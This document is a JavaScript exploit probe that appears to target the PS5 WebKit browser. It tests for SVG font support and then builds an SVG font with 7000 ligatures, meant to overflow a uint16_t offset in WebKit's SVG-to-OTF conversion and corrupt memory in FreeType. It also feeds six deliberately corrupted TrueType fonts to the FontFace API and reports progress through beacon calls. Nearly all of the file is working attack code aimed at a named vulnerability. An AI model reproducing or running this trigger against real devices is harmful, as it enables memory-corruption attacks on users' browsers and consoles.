// p250 — SVG font support test + Placeholder uint16_t overflow
//
// Phase 1: Quick test — does PS5 WebKit parse SVG fonts at all?
//   Creates a minimal SVG font with one distinctive glyph, loads via blob URL
//   with format("svg"), measures rendered width. If SVG fonts are unsupported
//   the font simply won't load.
//
// Phase 2: Overflow — build SVG font with 7000 ligature glyphs
//   SVGToOTFFontConversion.cpp Placeholder::populate() truncates delta to uint16_t
//   ASSERT-only check at line 118 stripped in release. With enough GSUB subtable
//   data (>65535 bytes), the toLookupList offset wraps → corrupted OTF → FreeType
//   parses garbage → potential OOB read/write.
//
// Phase 3: FontFace API fuzzing — 6 corrupted TTF variants fed to FT_New_Memory_Face
//
// Beacon prefix: V250S-

(function() {
  var B_Q = [], B_S = false;
  function B(tag, body) {
    B_Q.push([tag, body || '']);
    if (!B_S) drainB();
  }
  function drainB() {
    if (!B_Q.length) { B_S = false; return; }
    B_S = true;
    var it = B_Q.shift();
    try {
      navigator.sendBeacon('/beacon/V250S-' + it[0] + '?t=' + Date.now(), it[1]);
    } catch(e) {}
    setTimeout(drainB, 15);
  }

  B('BOOT');

  // ========== PHASE 1: SVG font support test ==========
  function phase1() {
    try {
      // Minimal SVG font with one glyph for 'X' that is very wide (2000 units)
      var svg = '<?xml version="1.0"?>' +
        '<svg xmlns="http://www.w3.org/2000/svg">' +
        '<defs><font id="T" horiz-adv-x="500">' +
        '<font-face font-family="SVGTest250" units-per-em="1000" ascent="800" descent="-200"/>' +
        '<missing-glyph horiz-adv-x="500" d="M0 0h500v800h-500z"/>' +
        '<glyph unicode="X" horiz-adv-x="2000" d="M0 0h2000v800h-2000z"/>' +
        '<glyph unicode="A" horiz-adv-x="500" d="M0 0h500v800h-500z"/>' +
        '</font></defs></svg>';

      var blob = new Blob([svg], {type: 'image/svg+xml'});
      var url = URL.createObjectURL(blob);

      var style = document.createElement('style');
      style.textContent = '@font-face { font-family: "SVGTest250"; src: url("' + url + '") format("svg"); }';
      document.head.appendChild(style);

      // Create test spans
      var container = document.createElement('div');
      container.style.cssText = 'position:absolute;left:-9999px;top:-9999px;font-size:48px;';

      var spanX = document.createElement('span');
      spanX.style.fontFamily = '"SVGTest250", monospace';
      spanX.textContent = 'XXXX';

      var spanA = document.createElement('span');
      spanA.style.fontFamily = '"SVGTest250", monospace';
      spanA.textContent = 'AAAA';

      var spanFB = document.createElement('span');
      spanFB.style.fontFamily = 'monospace';
      spanFB.textContent = 'XXXX';

      container.appendChild(spanX);
      container.appendChild(spanA);
      container.appendChild(spanFB);
      document.body.appendChild(container);

      B('P1-SPANS-OK');

      // Check after font load timeout
      setTimeout(function() {
        try {
          var wX = spanX.offsetWidth;
          var wA = spanA.offsetWidth;
          var wFB = spanFB.offsetWidth;
          B('P1-WIDTH', 'X=' + wX + ' A=' + wA + ' FB=' + wFB);

          // If SVG font loaded, X should be much wider than A (2000 vs 500 units)
          var ratio = wX / (wA || 1);
          B('P1-RATIO-' + ratio.toFixed(2));

          if (ratio > 2.5) {
            B('P1-SVG-FONTS-SUPPORTED');
            // Proceed to overflow
            setTimeout(phase2, 200);
          } else if (wX !== wFB) {
            B('P1-SVG-PARTIAL-' + wX + '-' + wFB);
            // Try overflow anyway
            setTimeout(phase2, 200);
          } else {
            B('P1-SVG-NOT-SUPPORTED');
            // Skip to FontFace TTF fuzzing
            setTimeout(phase3, 200);
          }

          URL.revokeObjectURL(url);
        } catch(e) {
          B('P1-MEASURE-ERR-' + e.message.substring(0, 40));
          setTimeout(phase3, 200);
        }
      }, 3000);

      // Also try FontFace API with SVG source
      try {
        var ff = new FontFace('SVGTest250b', 'url("' + url + '") format("svg")');
        ff.load().then(function() {
          B('P1-FF-LOAD-OK');
        }).catch(function(e) {
          B('P1-FF-LOAD-FAIL-' + e.message.substring(0, 30));
        });
        document.fonts.add(ff);
        B('P1-FF-API-OK');
      } catch(e) {
        B('P1-FF-ERR-' + e.message.substring(0, 30));
      }

    } catch(e) {
      B('P1-ERR-' + e.message.substring(0, 40));
      setTimeout(phase3, 200);
    }
  }

  // ========== PHASE 2: SVG font Placeholder uint16_t overflow ==========
  function phase2() {
    B('P2-START');
    try {
      var LIG_COUNT = 7000;
      var parts = [];

      parts.push('<?xml version="1.0"?>');
      parts.push('<svg xmlns="http://www.w3.org/2000/svg">');
      parts.push('<defs><font id="OVF" horiz-adv-x="500">');
      parts.push('<font-face font-family="OvfFont250" units-per-em="1000" ascent="800" descent="-200"/>');
      parts.push('<missing-glyph horiz-adv-x="500" d="M0 0h500v800h-500z"/>');

      // Base glyphs: 128 single characters (a-z, A-Z, 0-9 + extras)
      var baseChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      for (var i = 0; i < baseChars.length; i++) {
        parts.push('<glyph unicode="' + baseChars[i] + '" horiz-adv-x="600" d="M100 0h400v700h-400z"/>');
      }
      B('P2-BASE-' + baseChars.length);

      // Ligature glyphs: 2-char combos from base chars
      // Each ligature entry adds ~12 bytes to GSUB subtable
      // Need >65535 bytes → ~5500+ ligatures should overflow
      var ligCount = 0;
      for (var a = 0; a < baseChars.length && ligCount < LIG_COUNT; a++) {
        for (var b = 0; b < baseChars.length && ligCount < LIG_COUNT; b++) {
          var lig = baseChars[a] + baseChars[b];
          // Unique path per ligature to add more byte weight
          var pathD = 'M' + (ligCount % 400) + ' 0h' + (500 + (ligCount % 200)) + 'v700h-' + (500 + (ligCount % 200)) + 'z';
          parts.push('<glyph unicode="' + lig + '" horiz-adv-x="1200" d="' + pathD + '"/>');
          ligCount++;
        }
      }
      B('P2-LIGS-' + ligCount);

      parts.push('</font></defs></svg>');

      var svgText = parts.join('\n');
      B('P2-SVG-SIZE-' + svgText.length);

      var blob = new Blob([svgText], {type: 'image/svg+xml'});
      var url = URL.createObjectURL(blob);

      // Load via @font-face
      var style = document.createElement('style');
      style.textContent = '@font-face { font-family: "OvfFont250"; src: url("' + url + '") format("svg"); }';
      document.head.appendChild(style);

      // Also try FontFace API
      try {
        var ff = new FontFace('OvfFont250b', 'url("' + url + '") format("svg")');
        ff.load().then(function() {
          B('P2-FF-OK');
        }).catch(function(e) {
          B('P2-FF-FAIL-' + e.message.substring(0, 30));
        });
        document.fonts.add(ff);
      } catch(e) {
        B('P2-FF-ERR-' + e.message.substring(0, 30));
      }

      // Create test span to trigger rendering (and thus font conversion + FreeType parse)
      var span = document.createElement('span');
      span.style.cssText = 'font-family: "OvfFont250", monospace; font-size: 32px; position: absolute; left: -9999px;';
      // Text with many ligature pairs to exercise GSUB lookup
      var testText = '';
      for (var t = 0; t < 200; t++) {
        testText += baseChars.substring(t % 30, (t % 30) + 2);
      }
      span.textContent = testText;
      document.body.appendChild(span);

      B('P2-SPAN-SET');

      // Check after timeout
      setTimeout(function() {
        try {
          var w = span.offsetWidth;
          B('P2-WIDTH-' + w);

          // Try canvas rendering
          try {
            var c = document.createElement('canvas');
            c.width = 800; c.height = 100;
            var ctx = c.getContext('2d');
            ctx.font = '32px "OvfFont250"';
            ctx.fillText('abcdef', 10, 50);
            var px = ctx.getImageData(0, 0, 800, 100).data;
            var nonZero = 0;
            for (var p = 3; p < px.length; p += 4) {
              if (px[p] > 0) nonZero++;
            }
            B('P2-CANVAS-PIX-' + nonZero);
          } catch(e) {
            B('P2-CANVAS-ERR-' + e.message.substring(0, 30));
          }

          URL.revokeObjectURL(url);
        } catch(e) {
          B('P2-CHECK-ERR-' + e.message.substring(0, 40));
        }
        // Move to phase 3
        setTimeout(phase3, 500);
      }, 4000);

    } catch(e) {
      B('P2-ERR-' + e.message.substring(0, 40));
      setTimeout(phase3, 500);
    }
  }

  // ========== PHASE 3: FontFace API corrupted TTF fuzzing ==========
  function phase3() {
    B('P3-START');

    // Build minimal valid TTF
    function u16(v) { return [v >> 8 & 0xFF, v & 0xFF]; }
    function u32(v) { return [v >> 24 & 0xFF, v >> 16 & 0xFF, v >> 8 & 0xFF, v & 0xFF]; }
    function s16(v) { if (v < 0) v = 0x10000 + v; return u16(v); }

    function buildTTF() {
      var numTables = 9;
      var headerSize = 12 + numTables * 16;

      // Table data builders
      var tables = {};

      // head table (54 bytes)
      tables.head = [].concat(
        u16(0), u16(1),       // version 1.0
        u16(0), u16(1),       // fontRevision
        u32(0),               // checksumAdjust
        u32(0x5F0F3CF5),      // magicNumber
        u16(0x000B),          // flags
        u16(1000),            // unitsPerEm
        u32(0), u32(0), u32(0), u32(0), // created/modified
        s16(0), s16(0),       // xMin, yMin
        s16(1000), s16(800),  // xMax, yMax
        u16(0),               // macStyle
        u16(8),               // lowestRecPPEM
        s16(2),               // fontDirectionHint
        s16(1),               // indexToLocFormat (long)
        s16(0)                // glyphDataFormat
      );

      // hhea table (36 bytes)
      tables.hhea = [].concat(
        u16(0), u16(1),       // version
        s16(800),             // ascent
        s16(-200),            // descent
        s16(0),               // lineGap
        u16(1000),            // advanceWidthMax
        s16(0), s16(0),       // minLSB, minRSB
        s16(1000),            // xMaxExtent
        s16(1), s16(0),       // caretSlope
        s16(0),               // caretOffset
        s16(0), s16(0), s16(0), s16(0), // reserved
        s16(0),               // metricDataFormat
        u16(2)                // numHMetrics
      );

      // maxp (32 bytes)
      tables.maxp = [].concat(
        u16(0), u16(1),       // version 1.0
        u16(2),               // numGlyphs
        u16(64), u16(8),      // maxPoints, maxContours
        u16(0), u16(0),       // maxComposite*
        u16(1), u16(1),       // maxZones, maxTwilightPoints
        u16(0),               // maxStorage
        u16(0),               // maxFunctionDefs
        u16(0),               // maxInstructionDefs
        u16(0),               // maxStackElements
        u16(0),               // maxSizeOfInstructions
        u16(0),               // maxComponentElements
        u16(0)                // maxComponentDepth
      );

      // post table (32 bytes)
      tables.post = [].concat(
        u16(0), u16(3),       // version 3.0
        u32(0),               // italicAngle
        s16(-100),            // underlinePosition
        s16(50),              // underlineThickness
        u32(0),               // isFixedPitch
        u32(0), u32(0),       // minMemType42/maxMemType42
        u32(0), u32(0)        // minMemType1/maxMemType1
      );

      // name table
      var nameStr = 'Fuzz250';
      var nameBytes = [];
      for (var nc = 0; nc < nameStr.length; nc++) {
        nameBytes.push(0, nameStr.charCodeAt(nc));
      }
      var nameRecs = [];
      for (var nid = 0; nid < 7; nid++) {
        nameRecs = nameRecs.concat(
          u16(3), u16(1), u16(0x0409), u16(nid),
          u16(nameBytes.length), u16(6 + 7 * 12 + nid * 0)
        );
      }
      // All records point to same string at offset = 6 + 7*12 = 90
      // But we need the offset relative to stringOffset, which IS the start of strings
      var stringOffset = 6 + 7 * 12;
      for (var nr = 0; nr < 7; nr++) {
        nameRecs[nr * 6 + 4] = nameBytes.length >> 8;
        nameRecs[nr * 6 + 5] = nameBytes.length & 0xFF;
        nameRecs[nr * 6 + 10] = 0;
        nameRecs[nr * 6 + 11] = 0;
      }
      tables.name = [].concat(u16(0), u16(7), u16(stringOffset), nameRecs, nameBytes);

      // cmap table — format 4, maps char 65 ('A') to glyph 1
      var cmapSubtable = [].concat(
        u16(4),               // format
        u16(24),              // length
        u16(0),               // language
        u16(4),               // segCount*2
        u16(2), u16(0), u16(2), // searchRange, entrySelector, rangeShift
        u16(65), u16(0xFFFF), // endCode
        u16(0),               // reservedPad
        u16(65), u16(0xFFFF), // startCode
        s16(1 - 65), s16(1),  // idDelta
        u16(0), u16(0)        // idRangeOffset
      );
      tables.cmap = [].concat(
        u16(0), u16(1),       // version, numTables
        u16(3), u16(1), u32(12), // platformID, encodingID, offset
        cmapSubtable
      );

      // hmtx — 2 entries
      tables.hmtx = [].concat(u16(500), s16(0), u16(600), s16(0));

      // loca — long format, 2 glyphs + end
      tables.loca = [].concat(u32(0), u32(0), u32(0));

      // glyf — empty
      tables.glyf = [];

      // Assemble font
      var tableOrder = ['cmap', 'glyf', 'head', 'hhea', 'hmtx', 'loca', 'maxp', 'name', 'post'];
      var offset = headerSize;
      var directory = [];
      var tableData = [];

      for (var ti = 0; ti < tableOrder.length; ti++) {
        var tag = tableOrder[ti];
        var data = tables[tag];
        // Pad to 4-byte boundary
        while (data.length % 4 !== 0) data.push(0);
        var tagBytes = [tag.charCodeAt(0), tag.charCodeAt(1), tag.charCodeAt(2), tag.charCodeAt(3)];
        directory = directory.concat(tagBytes, u32(0), u32(offset), u32(data.length));
        tableData = tableData.concat(data);
        offset += data.length;
      }

      var header = [].concat(
        u32(0x00010000),      // sfVersion
        u16(numTables),
        u16(128), u16(3), u16(numTables * 16 - 128) // searchRange, entrySelector, rangeShift
      );

      return new Uint8Array(header.concat(directory, tableData));
    }

    var baseTTF = buildTTF();
    B('P3-TTF-' + baseTTF.length + 'B');

    // Corruption variants
    var variants = [
      { name: 'VALID', fn: function(d) { return d; } },
      { name: 'MAXP-FFFF', fn: function(d) {
        // Set numGlyphs to 0xFFFF
        for (var i = 0; i < d.length - 4; i++) {
          if (d[i] === 0 && d[i+1] === 1 && d[i+2] === 0 && d[i+3] === 2) {
            d[i+2] = 0xFF; d[i+3] = 0xFF; break;
          }
        }
        return d;
      }},
      { name: 'HEAD-UPEM-0', fn: function(d) {
        // Set unitsPerEm to 0
        for (var i = 0; i < d.length - 8; i++) {
          if (d[i] === 0x5F && d[i+1] === 0x0F && d[i+2] === 0x3C && d[i+3] === 0xF5) {
            d[i+6] = 0; d[i+7] = 0; break; // unitsPerEm at magic+4
          }
        }
        return d;
      }},
      { name: 'LOCA-OOB', fn: function(d) {
        // Set loca entries to point way past glyf end
        for (var i = 0; i < d.length - 12; i++) {
          if (d[i] === 0 && d[i+1] === 0 && d[i+2] === 0 && d[i+3] === 0 &&
              d[i+4] === 0 && d[i+5] === 0 && d[i+6] === 0 && d[i+7] === 0 &&
              d[i+8] === 0 && d[i+9] === 0 && d[i+10] === 0 && d[i+11] === 0 && i > 100) {
            d[i] = 0xFF; d[i+1] = 0xFF; d[i+2] = 0xFF; d[i+3] = 0xFE;
            d[i+4] = 0xFF; d[i+5] = 0xFF; d[i+6] = 0xFF; d[i+7] = 0xFF;
            break;
          }
        }
        return d;
      }},
      { name: 'HHEA-NUMHM-FFFF', fn: function(d) {
        // Set numHMetrics to 0xFFFF (at end of hhea table)
        for (var i = 0; i < d.length - 36; i++) {
          // Look for hhea signature: version 0001, ascent 0320 (800)
          if (d[i] === 0 && d[i+1] === 1 && d[i+2] === 0x03 && d[i+3] === 0x20) {
            d[i+34] = 0xFF; d[i+35] = 0xFF; break;
          }
        }
        return d;
      }},
      { name: 'CMAP-BIGSEG', fn: function(d) {
        // Corrupt cmap segCount to huge value
        for (var i = 0; i < d.length - 10; i++) {
          if (d[i] === 0 && d[i+1] === 4 && d[i+2] === 0 && d[i+3] === 24) {
            d[i+6] = 0xFF; d[i+7] = 0xFE; break; // segCount*2 = 0xFFFE
          }
        }
        return d;
      }}
    ];

    var vidx = 0;
    function nextVariant() {
      if (vidx >= variants.length) {
        B('P3-DONE');
        return;
      }
      var v = variants[vidx++];
      try {
        var copy = new Uint8Array(baseTTF);
        var mutated = v.fn(copy);
        var blob = new Blob([mutated], {type: 'font/ttf'});
        var url = URL.createObjectURL(blob);

        var ff = new FontFace('Fuzz250_' + v.name, 'url("' + url + '")');
        ff.load().then(function(loaded) {
          B('P3-OK-' + v.name);
          document.fonts.add(loaded);
          // Try render
          var sp = document.createElement('span');
          sp.style.cssText = 'font-family:"Fuzz250_' + v.name + '";font-size:32px;position:absolute;left:-9999px;';
          sp.textContent = 'AAAA';
          document.body.appendChild(sp);
          setTimeout(function() {
            B('P3-W-' + v.name + '-' + sp.offsetWidth);
            URL.revokeObjectURL(url);
            nextVariant();
          }, 500);
        }).catch(function(e) {
          B('P3-FAIL-' + v.name + '-' + e.message.substring(0, 25));
          URL.revokeObjectURL(url);
          nextVariant();
        });
      } catch(e) {
        B('P3-ERR-' + v.name + '-' + e.message.substring(0, 25));
        nextVariant();
      }
    }

    nextVariant();
  }

  // Start phase 1
  setTimeout(phase1, 100);
})();
